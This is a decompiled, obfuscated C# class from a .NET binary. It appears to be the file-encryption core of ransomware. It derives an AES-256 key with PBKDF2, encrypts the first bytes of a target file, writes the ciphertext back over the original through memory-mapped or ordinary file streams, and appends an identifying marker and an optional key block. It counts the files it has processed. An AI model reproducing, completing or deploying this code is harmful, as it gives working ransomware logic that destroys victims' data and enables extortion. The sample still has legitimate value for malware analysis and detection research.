using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace igelRrgoft;

public static class LZNaqbrBBsk
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] xvROdGWCNShy(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = EQpRfcTbfIe(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes EQpRfcTbfIe(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] VKNOYHjfGxPJrj(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (DbQGfNcxACeJl.RkUaESiNCKRAc == getString_0(107396770))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (DbQGfNcxACeJl.wnBkEuneoGOR)
			{
				try
				{
					File.AppendAllText(DbQGfNcxACeJl.EMMziOGItwvgBn, getString_0(107390513) + string_0 + getString_0(107404449) + ex.Message + getString_0(107396660));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void zRtbURaWGBf(string NGxKitMeGqa, byte[] SnDciYNnSqT, byte[] ESpdswCNdRrO = null)
	{
		try
		{
			byte[] array = null;
			if (DbQGfNcxACeJl.RkUaESiNCKRAc == getString_0(107396770))
			{
				array = (DbQGfNcxACeJl.pWVZjGlhSAv ? Encoding.ASCII.GetBytes(DbQGfNcxACeJl.fZQJZGRivPka(DbQGfNcxACeJl.nHbzLHWNkTpdce) + DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107404903)) + Convert.ToString(DbQGfNcxACeJl.dgOdFMVpedl) + DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107404903))) : Encoding.ASCII.GetBytes(DbQGfNcxACeJl.fZQJZGRivPka(DbQGfNcxACeJl.nHbzLHWNkTpdce) + DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107404944)) + Convert.ToString(DbQGfNcxACeJl.dgOdFMVpedl) + DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107404944))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(NGxKitMeGqa, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(SnDciYNnSqT, 0, SnDciYNnSqT.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(NGxKitMeGqa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!DbQGfNcxACeJl.pWVZjGlhSAv)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(ESpdswCNdRrO, 0, ESpdswCNdRrO.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (DbQGfNcxACeJl.pWVZjGlhSAv ? Encoding.ASCII.GetBytes(DbQGfNcxACeJl.fZQJZGRivPka(DbQGfNcxACeJl.nHbzLHWNkTpdce) + DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107404903)) + Convert.ToString(DbQGfNcxACeJl.dgOdFMVpedl) + DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107404903))) : Encoding.ASCII.GetBytes(DbQGfNcxACeJl.fZQJZGRivPka(DbQGfNcxACeJl.nHbzLHWNkTpdce) + DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107404944)) + Convert.ToString(DbQGfNcxACeJl.dgOdFMVpedl) + DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107404944))));
				FileStream fileStream2 = new FileStream(NGxKitMeGqa, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(SnDciYNnSqT, 0, SnDciYNnSqT.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(NGxKitMeGqa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!DbQGfNcxACeJl.pWVZjGlhSAv)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(ESpdswCNdRrO, 0, ESpdswCNdRrO.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			DbQGfNcxACeJl.GkQZQPTFEnIO++;
		}
		catch (Exception ex)
		{
			if (DbQGfNcxACeJl.wnBkEuneoGOR)
			{
				try
				{
					File.AppendAllText(DbQGfNcxACeJl.EMMziOGItwvgBn, getString_0(107390513) + NGxKitMeGqa + getString_0(107404894) + ex.Message + getString_0(107396660));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (DbQGfNcxACeJl.pWVZjGlhSAv ? Encoding.ASCII.GetBytes(DbQGfNcxACeJl.fZQJZGRivPka(DbQGfNcxACeJl.nHbzLHWNkTpdce) + DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107404903)) + Convert.ToString(DbQGfNcxACeJl.dgOdFMVpedl) + DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107404903))) : Encoding.ASCII.GetBytes(DbQGfNcxACeJl.fZQJZGRivPka(DbQGfNcxACeJl.nHbzLHWNkTpdce) + DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107404944)) + Convert.ToString(DbQGfNcxACeJl.dgOdFMVpedl) + DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107404944))));
			FileStream fileStream4 = new FileStream(NGxKitMeGqa, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(SnDciYNnSqT, 0, SnDciYNnSqT.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(NGxKitMeGqa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!DbQGfNcxACeJl.pWVZjGlhSAv)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(ESpdswCNdRrO, 0, ESpdswCNdRrO.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static LZNaqbrBBsk()
	{
		Strings.CreateGetStringDelegate(typeof(LZNaqbrBBsk));
	}
}
